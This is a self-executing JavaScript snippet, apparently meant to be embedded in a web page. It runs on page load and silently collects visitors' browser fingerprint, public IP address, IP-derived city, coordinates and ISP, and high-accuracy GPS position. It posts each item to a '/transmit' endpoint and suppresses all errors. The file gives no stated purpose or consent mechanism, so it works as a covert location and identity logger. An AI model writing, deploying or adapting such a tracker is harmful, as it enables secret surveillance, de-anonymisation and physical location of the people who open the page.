(function() {
    const deviceInfo = {
        t: new Date().toLocaleTimeString(),
        ua: navigator.userAgent,
        pl: navigator.platform,
        ce: navigator.cookieEnabled,
        bl: navigator.language,
        bn: navigator.appName,
        bc: navigator.appCodeName,
        rm: navigator.deviceMemory || 0,
        cc: navigator.hardwareConcurrency || 0,
        sw: screen.width,
        sh: screen.height,
        rf: document.referrer || '',
        os: navigator.oscpu || ''
    };

    async function sendData(type, payload) {
        try {
            await fetch('/transmit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, data: payload })
            });
        } catch (e) {}
    }

    async function collectData() {
        await sendData('device', deviceInfo);

        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            await sendData('ip', { ip: ipData.ip });

            const netRes = await fetch('https://ipapi.co/json/');
            const netData = await netRes.json();
            await sendData('network', {
                country: netData.country_name || 'unknown',
                city: netData.city || 'unknown',
                lat: netData.latitude || 0,
                lon: netData.longitude || 0,
                isp: netData.org || 'unknown'
            });

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendData('gps', {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        });
                    },
                    (err) => {
                        sendData('geo_error', { code: err.code, msg: err.message });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 30000,
                        maximumAge: 0
                    }
                );
            } else {
                sendData('geo_error', { msg: 'Geolocation not supported' });
            }
        } catch (err) {
            sendData('error', { msg: err.message });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', collectData);
    } else {
        collectData();
    }
})();
